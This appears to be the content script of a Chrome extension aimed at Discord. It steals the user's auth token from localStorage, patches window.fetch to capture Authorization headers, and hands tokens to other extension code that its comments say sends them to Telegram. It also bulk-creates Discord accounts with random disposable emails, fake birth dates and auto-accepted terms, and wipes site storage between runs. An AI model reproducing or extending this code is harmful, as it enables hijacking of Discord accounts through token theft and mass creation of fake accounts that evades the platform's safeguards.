const sleep = ms => new Promise(r => setTimeout(r, ms));
const $ = s => document.querySelector(s);
const $$ = s => document.querySelectorAll(s);
let tokenCache = null;
let fetchInterceptorInstalled = false;
let reportedTokens = new Set(); // Track tokens already reported in this session
const getTokenFromLocalStorage = () => {
  try {
    const token = localStorage.getItem("token");
    if (token) {
      const cleanToken = token.replace(/"/g, "");
      if (cleanToken.length > 50) {
        return cleanToken;
      }
    }
  } catch (e) {
  }
  return null;
};

const installFetchInterceptor = () => {
  if (fetchInterceptorInstalled) return;
  fetchInterceptorInstalled = true;
  const originalFetch = window.fetch;
  window.fetch = async function (...args) {
    const [resource, config] = args;
    const response = await originalFetch.apply(this, args);
    let authHeader = null;
    if (config?.headers) {
      if (typeof config.headers === 'object' && !(config.headers instanceof Headers)) {
        authHeader = config.headers.Authorization || config.headers.authorization;
      } else if (config.headers instanceof Headers) {
        authHeader = config.headers.get('Authorization');
      } else if (Array.isArray(config.headers)) {
        const auth = config.headers.find(h => h[0].toLowerCase() === 'authorization');
        authHeader = auth ? auth[1] : null;
      }
    }
    if (authHeader && authHeader.length > 50 && !tokenCache) {
      tokenCache = authHeader;
      // Only report token detection once per session, don't send to Telegram
      if (!reportedTokens.has(tokenCache)) {
        reportedTokens.add(tokenCache);
        chrome.runtime.sendMessage({ action: 'tokenReceived', token: tokenCache });
      }
    }
    return response;
  };
};

const triggerAuthRequest = async () => {
  try {
    await fetch('https://discord.com/api/v9/users/@me', {
      method: 'GET',
      credentials: 'include',
      headers: {
        'X-Context-Properties': JSON.stringify({ location: 'Register' })
      }
    });
  } catch (e) {}
};

const getToken = async () => {
  const localToken = getTokenFromLocalStorage();
  if (localToken && !tokenCache) {
    tokenCache = localToken;
    // Only report token detection once per session, don't send to Telegram
    if (!reportedTokens.has(tokenCache)) {
      reportedTokens.add(tokenCache);
      chrome.runtime.sendMessage({ action: 'tokenReceived', token: tokenCache });
    }
    return tokenCache;
  }

  if (tokenCache) return tokenCache;

  installFetchInterceptor();
  await triggerAuthRequest();

  for (let i = 0; i < 30; i++) {
    if (tokenCache) return tokenCache;

    const checkLocal = getTokenFromLocalStorage();
    if (checkLocal) {
      tokenCache = checkLocal;
      // Only report token detection once per session, don't send to Telegram
      if (!reportedTokens.has(tokenCache)) {
        reportedTokens.add(tokenCache);
        chrome.runtime.sendMessage({ action: 'tokenReceived', token: tokenCache });
      }
      return tokenCache;
    }

    await sleep(100);
  }

  return null;
};

const getTokenAndSend = async () => {
  await sleep(1000);
  const token = await getToken();

  if (token) {
    // Only report token detection once per session, sending to Telegram is handled by popup.js
    if (!reportedTokens.has(token)) {
      reportedTokens.add(token);
      chrome.runtime.sendMessage({ action: 'tokenReceived', token });
    }
    return token;
  } else {
    chrome.runtime.sendMessage({ action: 'tokenError', error: 'Token not found' });
    return null;
  }
};

const autoGetToken = async () => {
  if (!location.pathname.includes('/channels/@me')) return;

  const check = setInterval(async () => {
    const t = await getToken();
    if (t) {
      clearInterval(check);
    }
  }, 800);

  setTimeout(() => clearInterval(check), 10000);
};

const genEmail = () => {
  const domains = ['epmtyfl.me', 'sptech.io.vn'];
  const domain = domains[~~(Math.random() * domains.length)];
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  const s = Array(8).fill().map(() => chars[~~(Math.random() * chars.length)]).join('');
  const p = ~~(Math.random() * (s.length + 1));
  return `${s.slice(0, p)}khrua${s.slice(p)}@${domain}`;
};

const genUser = () => 'user_' + Math.random().toString(36).substr(2, 8);

const setVal = (el, val) => {
  if (!el) return;
  const descriptor = Object.getOwnPropertyDescriptor(el.__proto__, 'value');
  if (descriptor && descriptor.set) {
    descriptor.set.call(el, val);
    el.dispatchEvent(new Event('input', { bubbles: true }));
    el.dispatchEvent(new Event('change', { bubbles: true }));
  }
};

const selDD = async (sel, txt) => {
  const dd = $(sel);
  if (!dd) return false;
  dd.click();
  await sleep(500);
  const opt = Array.from($$('div[role="option"]')).find(o =>
    o.textContent.trim().toLowerCase() === txt.toLowerCase()
  );
  if (opt) {
    opt.click();
    await sleep(200);
    return true;
  }
  return false;
};

const fillDOB = async () => {
  await selDD('div[aria-label="Ngày"]', (1 + ~~(Math.random() * 28)).toString());
  await sleep(300);
  await selDD('div[aria-label="Tháng"]', `tháng ${1 + ~~(Math.random() * 12)}`);
  await sleep(300);
  await selDD('div[aria-label="Năm"]', (1990 + ~~(Math.random() * 16)).toString());
};

const tickCheckbox = async () => {
  let checkbox = $('input[type="checkbox"]');
  if (checkbox && !checkbox.checked) {
    checkbox.click();
    await sleep(300);
    return true;
  }

  checkbox = $('div[role="checkbox"]');
  if (checkbox && checkbox.getAttribute('aria-checked') !== 'true') {
    checkbox.click();
    await sleep(300);
    return true;
  }

  const buttons = Array.from($$('button'));
  checkbox = buttons.find(btn => {
    const label = (btn.getAttribute('aria-label') || '').toLowerCase();
    const text = btn.textContent.trim().toLowerCase();
    return ['terms', 'privacy', 'điều khoản', 'đồng ý'].some(term =>
      label.includes(term) || text.includes(term)
    );
  });

  if (checkbox) {
    checkbox.click();
    await sleep(300);
    return true;
  }

  return false;
};

const submitForm = async () => {
  let btn = $('button[type="submit"]');
  if (!btn) {
    const buttons = Array.from($$('button'));
    btn = buttons.find(b => {
      const text = b.textContent.trim().toLowerCase();
      return ['continue', 'tiếp tục', 'đăng ký', 'register'].some(t => text.includes(t));
    });
  }
  if (btn) {
    btn.click();
    return true;
  }
  return false;
};

const startReg = async (email) => {
  if (!email) {
    const stored = await chrome.storage.local.get(['currentEmail']);
    email = stored.currentEmail;
  }
  if (!email) {
    return;
  }

  const user = genUser();

  let emailInput = null;
  for (let i = 0; i < 10; i++) {
    emailInput = $('input[type="email"]');
    if (emailInput) break;
    await sleep(500);
  }
  if (!emailInput) {
    return;
  }
  
  setVal(emailInput, email);
  await sleep(500);

  const { displayName = 'Ngoc Tu w Phi Lon', regPassword = 'ntuwtphilon!?' } =
    await chrome.storage.local.get(['displayName', 'regPassword']);

  const inputs = {
    display: $('input[aria-label="Tên hiển thị"]'),
    username: $('input[aria-label="Tên đăng nhập"]'),
    password: $('input[aria-label="Mật khẩu"]')
  };

  for (let i = 0; i < 5; i++) {
    if (!inputs.display) inputs.display = $('input[aria-label="Tên hiển thị"]');
    if (!inputs.username) inputs.username = $('input[aria-label="Tên đăng nhập"]');
    if (!inputs.password) inputs.password = $('input[aria-label="Mật khẩu"]');
    if (Object.values(inputs).every(Boolean)) break;
    await sleep(300);
  }

  if (inputs.display) setVal(inputs.display, displayName);
  if (inputs.username) setVal(inputs.username, user);
  if (inputs.password) setVal(inputs.password, regPassword);

  await sleep(500);
  await fillDOB();
  await sleep(500);
  await tickCheckbox();
  await sleep(500);
  const submitted = await submitForm();

  if (submitted) {
    await sleep(2000);
    chrome.runtime.sendMessage({ action: 'startAutoVerify', email });
  }

  chrome.runtime.sendMessage({ action: 'emailCreated', email });
};

const clearData = async () => {
  localStorage.clear();
  sessionStorage.clear();
  document.cookie.split(';').forEach(c => {
    const name = c.split('=')[0].trim();
    document.cookie = `${name}=;expires=Thu, 01 Jan 1970 00:00:00 GMT;path=/;domain=.discord.com`;
  });

  if (window.indexedDB) {
    const dbs = await indexedDB.databases();
    dbs.forEach(db => db.name && indexedDB.deleteDatabase(db.name));
  }

  await chrome.storage.local.clear();

  location.reload();
};

let isAutoFilling = false;

const autoFillOnRegisterPage = async () => {
  if (!location.pathname.includes('/register')) return;
  if (isAutoFilling) return;

  isAutoFilling = true;
  await sleep(2000);

  const emailInput = $('input[type="email"]');
  if (emailInput?.value) {
    isAutoFilling = false;
    return;
  }

  const stored = await chrome.storage.local.get(['currentEmail', 'autoRegisterEnabled']);
  
  if (stored.currentEmail && stored.autoRegisterEnabled === true) {
    await chrome.storage.local.set({ autoRegisterEnabled: false });
    await startReg(stored.currentEmail);
  }

  isAutoFilling = false;
};

const checkAndGetToken = async () => {
  await sleep(2000);
  const token = getTokenFromLocalStorage();
  if (token && !tokenCache) {
    tokenCache = token;
    // Only report token detection once per session, sending to Telegram is handled by popup.js
    if (!reportedTokens.has(token)) {
      reportedTokens.add(token);
      chrome.runtime.sendMessage({ action: 'tokenReceived', token });
    }
  }
};

const checkVerifyComplete = async () => {
  if (location.pathname.includes('/channels/@me')) {
    const stored = await chrome.storage.local.get(['verifyInProgress']);
    if (stored.verifyInProgress === true) {
      chrome.runtime.sendMessage({ action: 'verifyCompleted' });
      await chrome.storage.local.set({ verifyInProgress: false });
    }
  }
};

if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', () => {
    installFetchInterceptor();
    autoGetToken();
    autoFillOnRegisterPage();
    checkAndGetToken();
    checkVerifyComplete();
  });
} else {
  installFetchInterceptor();
  autoGetToken();
  autoFillOnRegisterPage();
  checkAndGetToken();
  checkVerifyComplete();
}

chrome.runtime.onMessage.addListener((req, sender, sendResponse) => {
  if (req.action === 'startReg') {
    isAutoFilling = false;
    startReg(req.email);
  }
  if (req.action === 'clearData') clearData();
  if (req.action === 'getToken') getTokenAndSend();
});